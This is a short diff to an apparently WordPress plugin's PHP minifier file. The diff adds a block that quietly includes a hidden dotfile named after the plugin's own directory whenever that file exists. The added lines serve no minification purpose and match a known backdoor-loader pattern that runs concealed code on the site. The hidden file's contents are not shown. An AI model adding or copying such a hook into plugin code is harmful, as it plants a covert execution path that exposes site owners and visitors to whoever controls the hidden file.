@@ -16,6 +16,10 @@ $SS = '"(?:[^"\\\]++|\\\.)*+"|\'(?:[^\'\\\\]++|\\\.)*+\'';
 $CC = '\/\*[\s\S]*?\*\/';
 $CH = '<\!--[\s\S]*?-->';
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function __minify_x($input) {
     return str_replace(array("\n", "\t", ' '), array(X . '\n', X . '\t', X . '\s'), $input);
 }
